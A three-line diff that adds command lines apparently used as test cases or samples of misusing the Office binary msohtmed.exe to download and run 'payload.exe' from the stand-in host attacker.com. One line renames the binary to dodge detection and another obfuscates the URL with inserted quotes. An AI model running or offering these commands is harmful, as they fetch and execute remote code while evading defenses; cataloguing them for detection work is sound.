@@ -1,0 +1,3 @@
+copy msohtmed.exe not_an_editor.exe && not_an_editor.exe "http://attacker.com/payload.exe"
+msohtmed.exe "h"tt"p"s"://attacker.com/payload.exe"
+msohtmed.exe "payload.exe"
